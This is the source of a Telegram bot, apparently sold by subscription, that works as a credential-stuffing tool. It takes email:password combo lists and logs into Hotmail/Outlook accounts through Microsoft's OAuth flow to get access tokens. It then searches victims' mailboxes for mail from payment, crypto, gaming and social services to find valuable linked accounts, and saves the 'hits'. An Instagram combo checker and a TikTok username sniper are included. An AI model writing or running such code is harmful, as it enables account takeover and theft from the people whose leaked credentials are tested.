#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Hotmail MFC Checker Telegram Bot
Created by: @TTT9KK
Bot version with User Activation System
"""

import os
import sys
import io
import time
import json
import uuid
import datetime
import requests
import threading
import concurrent.futures
from pathlib import Path
from threading import Lock, Semaphore
import random
import re
import logging
import aiohttp
import asyncio

# Telegram Bot imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)

# Configuration
MY_SIGNATURE = "@TTT9KK"
TELEGRAM_CHANNEL = "https://t.me/TTT9KK"
ADMIN_IDS = [6043225431]  # آيدي المشرف

# Files
USERS_FILE = "users_data.json"
COMBOS_DIR = "combos"
RESULTS_DIR = "results"

# Create directories
os.makedirs(COMBOS_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global counters
lock = threading.Lock()
user_stats = {}
rate_limit_semaphore = Semaphore(500)

# Service definitions with categories
services = {
    # Social Media
    "Facebook": {"sender": "security@facebookmail.com", "file": "Hits_Facebook_by_@TTT9KK.txt", "category": "social"},
    "Instagram": {"sender": "security@mail.instagram.com", "file": "Hits_Instagram_by_@TTT9KK.txt", "category": "social"},
    "TikTok": {"sender": "register@account.tiktok.com", "file": "Hits_TikTok_by_@TTT9KK.txt", "category": "social"},
    "Twitter": {"sender": "info@x.com", "file": "Hits_Twitter_by_@TTT9KK.txt", "category": "social"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "Hits_LinkedIn_by_@TTT9KK.txt", "category": "social"},
    "Pinterest": {"sender": "no-reply@pinterest.com", "file": "Hits_Pinterest_by_@TTT9KK.txt", "category": "social"},
    "Reddit": {"sender": "noreply@reddit.com", "file": "Hits_Reddit_by_@TTT9KK.txt", "category": "social"},
    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "Hits_Snapchat_by_@TTT9KK.txt", "category": "social"},
    "VK": {"sender": "noreply@vk.com", "file": "Hits_VK_by_@TTT9KK.txt", "category": "social"},
    "WeChat": {"sender": "no-reply@wechat.com", "file": "Hits_WeChat_by_@TTT9KK.txt", "category": "social"},
    
    # Messaging
    "WhatsApp": {"sender": "no-reply@whatsapp.com", "file": "Hits_WhatsApp_by_@TTT9KK.txt", "category": "messaging"},
    "Telegram": {"sender": "telegram.org", "file": "Hits_Telegram_by_@TTT9KK.txt", "category": "messaging"},
    "Discord": {"sender": "noreply@discord.com", "file": "Hits_Discord_by_@TTT9KK.txt", "category": "messaging"},
    "Signal": {"sender": "no-reply@signal.org", "file": "Hits_Signal_by_@TTT9KK.txt", "category": "messaging"},
    "Line": {"sender": "no-reply@line.me", "file": "Hits_Line_by_@TTT9KK.txt", "category": "messaging"},
    
    # Streaming & Entertainment
    "Netflix": {"sender": "info@account.netflix.com", "file": "Hits_Netflix_by_@TTT9KK.txt", "category": "streaming"},
    "Spotify": {"sender": "no-reply@spotify.com", "file": "Hits_Spotify_by_@TTT9KK.txt", "category": "streaming"},
    "Twitch": {"sender": "no-reply@twitch.tv", "file": "Hits_Twitch_by_@TTT9KK.txt", "category": "streaming"},
    "YouTube": {"sender": "no-reply@youtube.com", "file": "Hits_YouTube_by_@TTT9KK.txt", "category": "streaming"},
    "Disney+": {"sender": "no-reply@disneyplus.com", "file": "Hits_DisneyPlus_by_@TTT9KK.txt", "category": "streaming"},
    "Hulu": {"sender": "account@hulu.com", "file": "Hits_Hulu_by_@TTT9KK.txt", "category": "streaming"},
    "HBO Max": {"sender": "no-reply@hbomax.com", "file": "Hits_HBOMax_by_@TTT9KK.txt", "category": "streaming"},
    "Amazon Prime": {"sender": "auto-confirm@amazon.com", "file": "Hits_AmazonPrime_by_@TTT9KK.txt", "category": "streaming"},
    "Apple TV+": {"sender": "no-reply@apple.com", "file": "Hits_AppleTV_by_@TTT9KK.txt", "category": "streaming"},
    "Crunchyroll": {"sender": "noreply@crunchyroll.com", "file": "Hits_Crunchyroll_by_@TTT9KK.txt", "category": "streaming"},
    
    # E-commerce & Shopping
    "Amazon": {"sender": "auto-confirm@amazon.com", "file": "Hits_Amazon_by_@TTT9KK.txt", "category": "shopping"},
    "eBay": {"sender": "newuser@nuwelcome.ebay.com", "file": "Hits_eBay_by_@TTT9KK.txt", "category": "shopping"},
    "Shopify": {"sender": "no-reply@shopify.com", "file": "Hits_Shopify_by_@TTT9KK.txt", "category": "shopping"},
    "Etsy": {"sender": "transaction@etsy.com", "file": "Hits_Etsy_by_@TTT9KK.txt", "category": "shopping"},
    "AliExpress": {"sender": "no-reply@aliexpress.com", "file": "Hits_AliExpress_by_@TTT9KK.txt", "category": "shopping"},
    "Walmart": {"sender": "no-reply@walmart.com", "file": "Hits_Walmart_by_@TTT9KK.txt", "category": "shopping"},
    
    # Payment & Finance
    "PayPal": {"sender": "service@paypal.com.br", "file": "Hits_PayPal_by_@TTT9KK.txt", "category": "finance"},
    "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "Hits_Binance_by_@TTT9KK.txt", "category": "finance"},
    "Coinbase": {"sender": "no-reply@coinbase.com", "file": "Hits_Coinbase_by_@TTT9KK.txt", "category": "finance"},
    "Revolut": {"sender": "no-reply@revolut.com", "file": "Hits_Revolut_by_@TTT9KK.txt", "category": "finance"},
    "Venmo": {"sender": "no-reply@venmo.com", "file": "Hits_Venmo_by_@TTT9KK.txt", "category": "finance"},
    "Cash App": {"sender": "no-reply@cash.app", "file": "Hits_CashApp_by_@TTT9KK.txt", "category": "finance"},
    
    # Gaming Platforms
    "Steam": {"sender": "noreply@steampowered.com", "file": "Hits_Steam_by_@TTT9KK.txt", "category": "gaming"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "Hits_Xbox_by_@TTT9KK.txt", "category": "gaming"},
    "PlayStation": {"sender": "reply@txn-email.playstation.com", "file": "Hits_PlayStation_by_@TTT9KK.txt", "category": "gaming"},
    "Epic Games": {"sender": "help@acct.epicgames.com", "file": "Hits_EpicGames_by_@TTT9KK.txt", "category": "gaming"},
    "EA Sports": {"sender": "EA@e.ea.com", "file": "Hits_EASports_by_@TTT9KK.txt", "category": "gaming"},
    "Ubisoft": {"sender": "noreply@ubisoft.com", "file": "Hits_Ubisoft_by_@TTT9KK.txt", "category": "gaming"},
    "Riot Games": {"sender": "no-reply@riotgames.com", "file": "Hits_RiotGames_by_@TTT9KK.txt", "category": "gaming"},
    "Valorant": {"sender": "noreply@valorant.com", "file": "Hits_Valorant_by_@TTT9KK.txt", "category": "gaming"},
    "Roblox": {"sender": "accounts@roblox.com", "file": "Hits_Roblox_by_@TTT9KK.txt", "category": "gaming"},
    "Minecraft": {"sender": "noreply@mojang.com", "file": "Hits_Minecraft_by_@TTT9KK.txt", "category": "gaming"},
    "Fortnite": {"sender": "noreply@epicgames.com", "file": "Hits_Fortnite_by_@TTT9KK.txt", "category": "gaming"},
    
    # Tech & Productivity
    "Google": {"sender": "no-reply@accounts.google.com", "file": "Hits_Google_by_@TTT9KK.txt", "category": "tech"},
    "Microsoft": {"sender": "account-security-noreply@accountprotection.microsoft.com", "file": "Hits_Microsoft_by_@TTT9KK.txt", "category": "tech"},
    "Apple": {"sender": "no-reply@apple.com", "file": "Hits_Apple_by_@TTT9KK.txt", "category": "tech"},
    "GitHub": {"sender": "noreply@github.com", "file": "Hits_GitHub_by_@TTT9KK.txt", "category": "tech"},
    "Dropbox": {"sender": "no-reply@dropbox.com", "file": "Hits_Dropbox_by_@TTT9KK.txt", "category": "tech"},
    "Zoom": {"sender": "no-reply@zoom.us", "file": "Hits_Zoom_by_@TTT9KK.txt", "category": "tech"},
    "Slack": {"sender": "no-reply@slack.com", "file": "Hits_Slack_by_@TTT9KK.txt", "category": "tech"},
    
    # VPN & Security
    "NordVPN": {"sender": "no-reply@nordvpn.com", "file": "Hits_NordVPN_by_@TTT9KK.txt", "category": "security"},
    "ExpressVPN": {"sender": "no-reply@expressvpn.com", "file": "Hits_ExpressVPN_by_@TTT9KK.txt", "category": "security"},
    
    # Travel & Transportation
    "Airbnb": {"sender": "no-reply@airbnb.com", "file": "Hits_Airbnb_by_@TTT9KK.txt", "category": "travel"},
    "Uber": {"sender": "no-reply@uber.com", "file": "Hits_Uber_by_@TTT9KK.txt", "category": "travel"},
    "Booking.com": {"sender": "no-reply@booking.com", "file": "Hits_Booking_by_@TTT9KK.txt", "category": "travel"},
    
    # Food Delivery
    "Uber Eats": {"sender": "no-reply@ubereats.com", "file": "Hits_UberEats_by_@TTT9KK.txt", "category": "food"},
    "DoorDash": {"sender": "no-reply@doordash.com", "file": "Hits_DoorDash_by_@TTT9KK.txt", "category": "food"},
}

# ==================== INSTAGRAM CHECKER ====================

def encrypt_instagram_password(password, timestamp=None):
    """Encrypt password for Instagram login"""
    import base64
    if timestamp is None:
        timestamp = int(time.time())
    
    # Simple encryption (Instagram uses more complex encryption in reality)
    version = "10"
    encoded = base64.b64encode(password.encode()).decode()
    
    return f"#PWD_BROWSER:{version}:{timestamp}:{encoded}"

async def check_instagram_account(username, password):
    """Check Instagram account credentials"""
    try:
        url = "https://www.instagram.com/api/graphql"
        
        # Encrypt password
        timestamp = int(time.time())
        enc_password = encrypt_instagram_password(password, timestamp)
        
        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/login/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-csrftoken': 'missing',
            'x-fb-friendly-name': 'useCDSWebLoginMutation',
            'x-ig-app-id': '936619743392459',
        }
        
        variables = {
            "input": {
                "actor_id": "0",
                "client_mutation_id": "1",
                "app": "instagram",
                "credential_type": "password",
                "enc_password": {"sensitive_string_value": enc_password},
                "identifier": username,
                "persistent": True,
                "login_source": "LOGIN",
            }
        }
        
        data = {
            'variables': json.dumps(variables),
            'doc_id': '9807605492696448'
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=15)
        
        if response.status_code == 200:
            result = response.json()
            
            # Check if login successful
            if 'data' in result and result['data']:
                caa_login = result['data'].get('caa_login_web', {})
                
                if caa_login.get('ig_authenticated'):
                    return True, "valid"
                elif caa_login.get('two_factor_result'):
                    return "2fa", "2fa_required"
                elif caa_login.get('error_code'):
                    return False, "invalid"
                else:
                    return False, "invalid"
            else:
                return False, "invalid"
        
        elif response.status_code == 429:
            return None, "rate_limited"
        else:
            return None, "error"
            
    except Exception as e:
        logger.error(f"Instagram check error: {e}")
        return None, "error"

# ==================== ADMIN NOTIFICATIONS ====================

async def notify_admin(context, user, action, details=""):
    """Send notification to admin about user actions"""
    user_id = user.id
    username = user.username if user.username else "بدون معرف"
    first_name = user.first_name if user.first_name else "مستخدم"
    
    notification = f"""
📊 <b>نشاط جديد في البوت</b>

👤 <b>الاسم:</b> {first_name}
🔗 <b>المعرف:</b> @{username}
🆔 <b>الآيدي:</b> <code>{user_id}</code>

⚡ <b>الإجراء:</b> {action}
{details}

📅 <b>الوقت:</b> {datetime.datetime.now().strftime("%Y-%m-%d %H:%M")}

💎 <b>Created by @TTT9KK</b>
    """
    
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=notification,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Error sending admin notification: {e}")

# ==================== TIKTOK USERNAME CHECKER ====================

async def check_tiktok_username(username):
    """Check if TikTok username is available - Updated Method"""
    try:
        # Method 1: Direct TikTok check
        url = f"https://www.tiktok.com/@{username}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 404:
                    return True, "available"
                elif resp.status == 200:
                    # Double check - sometimes returns 200 but user doesn't exist
                    text = await resp.text()
                    if "This account cannot be found" in text or "Couldn't find this account" in text:
                        return True, "available"
                    else:
                        return False, "taken"
                else:
                    return None, "error"
                    
    except asyncio.TimeoutError:
        return None, "timeout"
    except Exception as e:
        logger.error(f"Error checking TikTok username: {e}")
        return None, "error"

def generate_username(user_type, with_numbers):
    """Generate random username"""
    import string
    
    LETTERS = string.ascii_lowercase
    DIGITS = string.digits
    
    chars = LETTERS + (DIGITS if with_numbers else "")
    
    if user_type == "4l":
        return ''.join(random.choices(chars, k=4))
    
    if user_type == "3l":
        return ''.join(random.choices(chars, k=3))
    
    # 3l with underscore
    a, b = random.choices(LETTERS, k=2)
    c = random.choice(chars)
    return f"{a}_{b}{c}" if random.random() < 0.5 else f"{a}{b}{c}_"

async def start_tiktok_sniper(update: Update, context: ContextTypes.DEFAULT_TYPE, user_type, with_numbers, delay, max_checks):
    """Start TikTok username sniper"""
    user_id = update.effective_user.id
    
    if not user_manager.is_active(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ حسابك غير مفعّل!")
        return
    
    found_count = 0
    checked_count = 0
    
    status_msg = await update.message.reply_text(
        f"""
🎯 <b>TikTok Username Sniper</b>

⏳ جاري البحث...
📊 تم الفحص: 0
✅ متاح: 0

💎 <b>Created by @TTT9KK</b>
        """,
        parse_mode='HTML'
    )
    
    import aiohttp
    
    async with aiohttp.ClientSession() as session:
        while checked_count < max_checks:
            # Generate random username
            username = generate_username(user_type, with_numbers)
            
            # Check availability
            available, status = await check_tiktok_username(username)
            
            checked_count += 1
            
            if available:
                found_count += 1
                
                # Notify admin about TikTok username find
                for admin_id in ADMIN_IDS:
                    try:
                        admin_msg = f"""
🎯 <b>صيد TikTok Username!</b>

👤 <b>المستخدم:</b> {update.effective_user.first_name}
🔗 <b>المعرف:</b> @{update.effective_user.username if update.effective_user.username else 'بدون معرف'}
🆔 <b>الآيدي:</b> <code>{user_id}</code>

✅ <b>اليوزر المتاح:</b> <code>{username}</code>
🔗 <b>الرابط:</b> https://www.tiktok.com/@{username}

📅 <b>الوقت:</b> {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

💎 <b>Created by @TTT9KK</b>
                        """
                        await context.bot.send_message(
                            chat_id=admin_id,
                            text=admin_msg,
                            parse_mode='HTML'
                        )
                    except Exception as e:
                        logger.error(f"Error notifying admin: {e}")
                
                # Send available username
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"""
✅ <b>اسم متاح!</b>

👤 <b>Username:</b> <code>{username}</code>
🔗 <b>Link:</b> https://www.tiktok.com/@{username}

💎 <b>Created by @TTT9KK</b>
                    """,
                    parse_mode='HTML'
                )
            
            # Update progress every 10 checks
            if checked_count % 10 == 0:
                await status_msg.edit_text(
                    f"""
🎯 <b>TikTok Username Sniper</b>

⏳ جاري البحث...
📊 تم الفحص: {checked_count}
✅ متاح: {found_count}

💎 <b>Created by @TTT9KK</b>
                    """,
                    parse_mode='HTML'
                )
            
            # Delay
            await asyncio.sleep(delay)
    
    # Final message
    await status_msg.edit_text(
        f"""
✅ <b>اكتمل البحث!</b>

📊 <b>النتائج:</b>
• تم الفحص: {checked_count}
• متاح: {found_count}

💎 <b>Created by @TTT9KK</b>
        """,
        parse_mode='HTML'
    )

# ==================== USER MANAGEMENT ====================

class UserManager:
    def __init__(self):
        self.users = self.load_users()
    
    def load_users(self):
        """Load users from JSON file"""
        if os.path.exists(USERS_FILE):
            try:
                with open(USERS_FILE, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def save_users(self):
        """Save users to JSON file"""
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(self.users, f, indent=4, ensure_ascii=False)
    
    def add_user(self, user_id, duration_type, duration_value):
        """Add or update user activation"""
        user_id = str(user_id)
        now = datetime.datetime.now()
        
        if duration_type == "hour":
            expire_date = now + datetime.timedelta(hours=duration_value)
        elif duration_type == "day":
            expire_date = now + datetime.timedelta(days=duration_value)
        elif duration_type == "month":
            expire_date = now + datetime.timedelta(days=duration_value * 30)
        elif duration_type == "year":
            expire_date = now + datetime.timedelta(days=duration_value * 365)
        else:
            return False
        
        self.users[user_id] = {
            "activated_at": now.isoformat(),
            "expires_at": expire_date.isoformat(),
            "duration_type": duration_type,
            "duration_value": duration_value,
            "total_checks": 0,
            "total_hits": 0
        }
        self.save_users()
        return True
    
    def is_active(self, user_id):
        """Check if user is active"""
        user_id = str(user_id)
        
        # Admin always active
        if int(user_id) in ADMIN_IDS:
            return True
        
        if user_id not in self.users:
            return False
        
        expire_date = datetime.datetime.fromisoformat(self.users[user_id]["expires_at"])
        return datetime.datetime.now() < expire_date
    
    def get_user_info(self, user_id):
        """Get user information"""
        user_id = str(user_id)
        if user_id not in self.users:
            return None
        return self.users[user_id]
    
    def remove_user(self, user_id):
        """Remove user activation"""
        user_id = str(user_id)
        if user_id in self.users:
            del self.users[user_id]
            self.save_users()
            return True
        return False
    
    def get_all_users(self):
        """Get all users"""
        return self.users
    
    def update_stats(self, user_id, hits=0, checks=0):
        """Update user statistics"""
        user_id = str(user_id)
        if user_id in self.users:
            self.users[user_id]["total_hits"] += hits
            self.users[user_id]["total_checks"] += checks
            self.save_users()

# Initialize user manager
user_manager = UserManager()

# ==================== HOTMAIL CHECKER ====================

def get_hotmail_token(email, password):
    """Original strong method from hotmail-2V.py"""
    try:
        session = requests.Session()
        
        # Step 1: Check email type
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        headers1 = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": str(uuid.uuid4()),
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        
        r1 = session.get(url1, headers=headers1, timeout=15)
        
        if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
            return None, "bad"
        if "MSAccount" not in r1.text:
            return None, "bad"
        
        time.sleep(0.3)
        
        # Step 2: Get authorization page
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        
        r2 = session.get(url2, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }, allow_redirects=True, timeout=15)
        
        # Extract login URL and PPFT
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        
        if not url_match or not ppft_match:
            return None, "parse_error"
        
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        
        # Step 3: Login
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        
        r3 = session.post(post_url, data=login_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }, allow_redirects=False, timeout=15)
        
        # Check for errors
        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
            return None, "bad"
        
        if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
            return None, "locked"
        
        # Get authorization code
        location = r3.headers.get("Location", "")
        if not location:
            return None, "bad"
        
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return None, "bad"
        
        code = code_match.group(1)
        
        # Step 4: Get access token
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        
        if r4.status_code != 200 or "access_token" not in r4.text:
            return None, "bad"
        
        token_json = r4.json()
        access_token = token_json["access_token"]
        
        # Get CID
        mspcid = None
        for cookie in session.cookies:
            if cookie.name == "MSPCID":
                mspcid = cookie.value
                break
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        
        return {"token": access_token, "cid": cid}, "success"
        
    except requests.exceptions.Timeout:
        return None, "timeout"
    except requests.exceptions.ConnectionError:
        return None, "connection_error"
    except Exception as e:
        logger.error(f"Check error: {e}")
        return None, "error"

def check_via_imap(email, password):
    """Backup method - not used with original method"""
    return None, "not_used"

def check_account(email, password, user_id, selected_services=None):
    """Check single account using original strong method - ENHANCED"""
    result = {
        "email": email,
        "password": password,
        "status": "bad",
        "services": {},
        "message": ""
    }
    
    try:
        # Get token using original method
        token_data, status = get_hotmail_token(email, password)
        
        logger.info(f"Checking {email} - Status: {status}")
        
        if status == "success" and token_data:
            result["status"] = "hit"
            result["message"] = "✅ Valid Account"
            
            # Log the hit
            logger.info(f"✅ HIT FOUND: {email}:{password}")
            
            # Check for services if token available
            if token_data and isinstance(token_data, dict):
                access_token = token_data.get("token")
                cid = token_data.get("cid")
                
                logger.info(f"Got token for {email}, checking services...")
                
                if access_token and cid:
                    try:
                        services_found = check_emails_for_services_v2(access_token, cid, email, selected_services)
                        result["services"] = services_found
                        
                        logger.info(f"Services found for {email}: {list(services_found.keys())}")
                        
                        if services_found:
                            result["message"] += f" | 🎯 {len(services_found)} services"
                        else:
                            logger.warning(f"No services found for {email}")
                    except Exception as e:
                        logger.error(f"Error checking services for {email}: {e}")
                else:
                    logger.warning(f"No token/cid for {email}")
            
            # Update stats
            user_manager.update_stats(user_id, hits=1, checks=1)
            
        elif status == "locked":
            result["status"] = "locked"
            result["message"] = "🔒 Account Locked"
            logger.info(f"🔒 LOCKED: {email}")
            user_manager.update_stats(user_id, checks=1)
            
        elif status == "timeout":
            result["status"] = "retry"
            result["message"] = "⏱️ Timeout"
            logger.warning(f"⏱️ TIMEOUT: {email}")
            
        elif status == "connection_error":
            result["status"] = "retry"
            result["message"] = "🔌 Connection Error"
            logger.warning(f"🔌 CONNECTION ERROR: {email}")
            
        elif status == "parse_error":
            result["status"] = "retry"
            result["message"] = "🔄 Parse Error - Retry"
            logger.warning(f"🔄 PARSE ERROR: {email}")
            
        else:
            result["status"] = "bad"
            result["message"] = "❌ Invalid"
            logger.info(f"❌ BAD: {email}")
            user_manager.update_stats(user_id, checks=1)
    
    except Exception as e:
        logger.error(f"❌ Error checking {email}: {e}")
        import traceback
        logger.error(traceback.format_exc())
        result["status"] = "error"
        result["message"] = f"❌ Error"
    
    return result

def check_emails_for_services_v2(access_token, cid, email, selected_services=None):
    """Check for services using Outlook Search API - FIXED"""
    try:
        search_url = "https://outlook.live.com/search/api/v2/query"
        
        services_to_check = {selected_services: services[selected_services]} if selected_services else services
        
        found_services = {}
        
        for service_name, service_info in services_to_check.items():
            sender = service_info["sender"]
            
            # Search payload
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Mailbox"],
                    "Query": {
                        "QueryString": f"from:{sender}",
                    },
                    "Sort": [{"Field": "Time", "SortDirection": "DESC"}],
                    "From": 0,
                    "Size": 1
                }]
            }
            
            headers = {
                "Authorization": f"Bearer {access_token}",
                "X-OWA-CANARY": cid,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            }
            
            try:
                response = requests.post(search_url, json=payload, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # Check if results exist
                    if data.get("EntitySets") and len(data["EntitySets"]) > 0:
                        entities = data["EntitySets"][0].get("ResultSet", {}).get("Entities", [])
                        if len(entities) > 0:
                            found_services[service_name] = True
                            logger.info(f"Service found: {service_name} for {email}")
                
                # Small delay between searches
                time.sleep(0.05)
                
            except Exception as e:
                logger.error(f"Error searching {service_name}: {e}")
                continue
        
        logger.info(f"Total services found for {email}: {len(found_services)}")
        return found_services
        
    except Exception as e:
        logger.error(f"Error in check_emails_for_services_v2: {e}")
        return {}

# ==================== BOT HANDLERS ====================

async def instagram_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Instagram checker command"""
    user_id = update.effective_user.id
    
    if not user_manager.is_active(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"""
❌ <b>حسابك غير مفعّل!</b>

👤 آيديك: <code>{user_id}</code>

للحصول على اشتراك، تواصل مع المطور:
{MY_SIGNATURE}
            """,
            parse_mode='HTML'
        )
        return
    
    await update.message.reply_text(
        """
📸 <b>Instagram Account Checker</b>

أرسل ملف كومبو بالصيغة:
<code>username:password</code>

مثال:
<code>user1:pass123
user2:pass456</code>

💎 <b>Created by @TTT9KK</b>
        """,
        parse_mode='HTML'
    )
    
    context.user_data['waiting_for_instagram'] = True

async def tiktok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """TikTok username sniper command"""
    user_id = update.effective_user.id
    
    if not user_manager.is_active(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"""
❌ <b>حسابك غير مفعّل!</b>

👤 آيديك: <code>{user_id}</code>

للحصول على اشتراك، تواصل مع المطور:
{MY_SIGNATURE}
            """,
            parse_mode='HTML'
        )
        return
    
    keyboard = [
        [
            InlineKeyboardButton("4 أحرف (4l)", callback_data="tiktok_4l"),
            InlineKeyboardButton("3 أحرف (3l)", callback_data="tiktok_3l")
        ],
        [
            InlineKeyboardButton("3 أحرف + _ (3l_)", callback_data="tiktok_3l_")
        ],
        [
            InlineKeyboardButton("❌ إلغاء", callback_data="cancel")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"""
🎯 <b>TikTok Username Sniper</b>

اختر نوع اسم المستخدم:

<b>📝 الأنواع:</b>
• <b>4l:</b> 4 أحرف عشوائية (مثل: abcd)
• <b>3l:</b> 3 أحرف عشوائية (مثل: abc)
• <b>3l_:</b> 3 أحرف + _ (مثل: a_bc أو ab_c)

💎 <b>Created by @TTT9KK</b>
        """,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    user = update.effective_user
    user_id = user.id
    username = user.username if user.username else "بدون معرف"
    first_name = user.first_name if user.first_name else "مستخدم"
    
    # Check if this is a new user
    is_new_user = str(user_id) not in user_manager.users
    
    # Send notification to admin for new users
    if is_new_user:
        for admin_id in ADMIN_IDS:
            try:
                admin_notification = f"""
🆕 <b>مستخدم جديد دخل البوت!</b>

👤 <b>الاسم:</b> {first_name}
🔗 <b>المعرف:</b> @{username}
🆔 <b>الآيدي:</b> <code>{user_id}</code>
📅 <b>التاريخ:</b> {datetime.datetime.now().strftime("%Y-%m-%d %H:%M")}

💡 <b>لتفعيله استخدم:</b>
<code>/activate {user_id} 7 day</code>

💎 <b>Created by @TTT9KK</b>
                """
                
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=admin_notification,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error sending admin notification: {e}")
    
    # Check if user is activated
    is_active = user_manager.is_active(user_id) or user_id in ADMIN_IDS
    
    if not is_active:
        # User not activated - show restricted menu
        keyboard = [
            [InlineKeyboardButton("👑 اشترك الآن - VIP", callback_data="vip_plans")],
            [InlineKeyboardButton("📊 حالة الاشتراك", callback_data="my_status")],
            [InlineKeyboardButton("📞 الدعم الفني", url=TELEGRAM_CHANNEL)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"""
🔒 <b>مرحباً {first_name}!</b>

❌ <b>حسابك غير مفعّل</b>

للوصول إلى جميع الميزات، يجب عليك الاشتراك أولاً.

👤 <b>آيديك:</b> <code>{user_id}</code>

━━━━━━━━━━━━━━━━━━━━

<b>✨ خدمات البوت:</b>
🔵 فحص Hotmail (70+ خدمة)
📸 فحص Instagram  
🎯 TikTok Username Sniper

━━━━━━━━━━━━━━━━━━━━

💎 <b>Created by @TTT9KK</b>
📢 <b>القناة:</b> {TELEGRAM_CHANNEL}
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    # User is activated - show full menu
    # Get user info
    user_info = user_manager.users.get(str(user_id), {})
    expires = user_info.get("expires_at", "غير محدد")
    if expires != "غير محدد":
        expires_date = datetime.datetime.fromisoformat(expires)
        days_left = (expires_date - datetime.datetime.now()).days
